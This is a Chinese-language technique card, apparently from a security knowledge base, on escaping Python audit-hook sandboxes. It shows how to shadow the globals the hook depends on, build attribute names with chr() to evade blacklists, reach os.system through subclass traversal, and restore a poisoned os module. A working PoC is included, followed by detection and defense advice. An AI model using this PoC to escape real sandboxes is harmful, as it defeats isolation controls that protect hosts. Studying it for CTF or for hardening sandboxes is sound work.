---
id: binary-pwn-sandbox-escape-python-audit-hook-bypass
title: Python 审计钩子沙箱绕过：遮蔽钩子依赖的内建并恢复被污染的 os
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: python-audit-hook-bypass
aliases:
- audit hook 绕过
- PEP 578 绕过
- sys.addaudithook 逃逸
- 审计钩子沙箱
tags:
- python
- pyjail
- sandbox-escape
- audit-hook
- pep578
- cpython
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-04'
updated: '2026-11-04'
verification:
  verified_by: verifier-H
  verified_at: '2026-11-04T19:39:49+08:00'
  notes: 来源 93062；已对照原文核对；遮蔽 len 与事件判断函数、del sys.modules 中 os 项后重导、以及用 chr 拼接属性链均与原文及截图一致；截图显示属性污染可用 importlib.reload 恢复，与正文表述不一致，已在卡中注明；未在真实目标环境复测。
---

## 一句话结论

把用户代码和审计钩子函数放在同一个模块全局里执行时，用户可以用同名 `def` 覆盖钩子函数运行时依赖的 `len`、事件判断函数等全局名，让钩子对所有事件直接放行；再用子类遍历拿到 `os.system`，并删除被污染的 `sys.modules["os"]` 恢复正常导入。

## 原理

`sys.addaudithook()` 注册的钩子是一个普通 Python 函数，它在每次敏感操作时被调用。若沙箱把钩子定义和用户代码拼进同一个脚本/同一份 globals，钩子内部引用的 `len`、`is_xxx_event` 等名字按 Python 的 LEGB 规则在模块全局字典中查找。用户代码先执行：

```python
def len(x): return 0
def is_my_love_event(x): return True
```

就把模块全局里的 `len` 和事件判断函数替换掉了。此后钩子执行 `if len(event_name) > 0: raise` 永远得到 0，`if not is_my_love_event(event_name): raise` 永远为假，于是 `os.system`、`open` 等审计事件不再被拦截。

另一层障碍是 `sys.modules["os"] = "not allowed"`：它把 `os` 模块缓存替换成字符串，之后 `import os` 拿到字符串，无法调用 `os.system`。但已经加载的 `os` 模块对象仍可通过其他模块的 `__globals__` 或子类遍历间接访问；也可以直接删除这个污染项后重新导入。

## 触发条件

- 使用 `sys.addaudithook` 作为主要隔离手段；
- 钩子函数与用户代码共享同一个模块命名空间（最典型的实现是把用户代码 `{code}` 拼进含钩子的临时脚本）；
- 钩子内部通过模块全局名调用 `len()`、自定义判断函数，而不是闭包/默认参数/内建别名；
- 用户代码在钩子安装之后执行（同文件后部），可覆盖这些名字；
- `sys.modules["os"]` 被替换但进程仍可 `del` 该项并重新 import。

## 利用步骤

1. 先覆盖钩子依赖的全局名：`def len(x): return 0`，并覆盖钩子调用的事件判断函数；
2. 使用 `chr()`/`bytes([...]).decode()` 构造 `__class__`、`__subclasses__`、`__init__`、`__globals__`、`_wrap_close`、`system` 等关键字，绕过源码黑名单；
3. 从 `_wrap_close.__init__.__globals__["system"]` 直接执行命令，不依赖 `import os`；
4. 若后续需要 `os`/`subprocess`，执行 `del sys.modules["os"]` 后再 `import os` 得到干净模块；
5. 用恢复后的 `__import__("subprocess").getoutput(...)` 取回显。

## PoC

```python
# 1) 让审计钩子的检查失效
def len(x): return 0
def is_my_love_event(x): return True

# 2) 用 chr 拼接绕过关键字黑名单（示意）
clss = str().join(chr(x) for x in [0x5f,0x5f,0x63,0x6c,0x61,0x73,0x73,0x5f,0x5f])  # __class__
wrapc = str().join(chr(x) for x in [0x5f,0x77,0x72,0x61,0x70,0x5f,0x63,0x6c,0x6f,0x73,0x65])  # _wrap_close
for c in getattr((), clss).__bases__[0].__subclasses__():
    if getattr(c, "__name__", "") == wrapc:
        print(c.__init__.__globals__["system"]("id"))
        break

# 3) 恢复被污染的 os（需能拿到 sys）
del __import__("sys").modules["os"]
import os
os.system("id")
```

图片证据补充：对“已导入后把属性改成 1”的污染，`importlib.reload(os)` 可以恢复 `os.system`；对 `sys.modules["os"]` 被替换成字符串的情况，删除缓存项再 `import os` 可得到新模块。原文正文称“模块对象被污染无法重载”，与截图表现不一致，实际能否 reload 取决于污染方式，使用时以目标环境实测为准。

## 变体与关联

- 变体：覆盖 `len`、事件判断函数、`isinstance`、异常类等钩子依赖名；用 `sys.modules` 删除/替换已加载模块。
- 关联：子类遍历基础逃逸；`eval` 关键字过滤绕过。

## 检测与防御

- 检测：用户代码中出现对 `len`、钩子判断函数的重新定义；出现 `del sys.modules[...]`、对 `sys.modules` 的写入；出现 chr/bytes 拼接的长属性链。
- 防御：钩子内使用闭包或默认参数固定内建引用（如 `_len = len`，`def hook(ev, args, _len=_len)`），不要依赖可被用户改写的模块全局；把钩子放在用户代码不可达的独立模块；对 `sys.modules` 的修改做额外监控。
- 审计钩子只能作为纵深防御的一层，不能单独承担沙箱职责；最终隔离应落到独立进程/容器/seccomp 和低权限用户上。
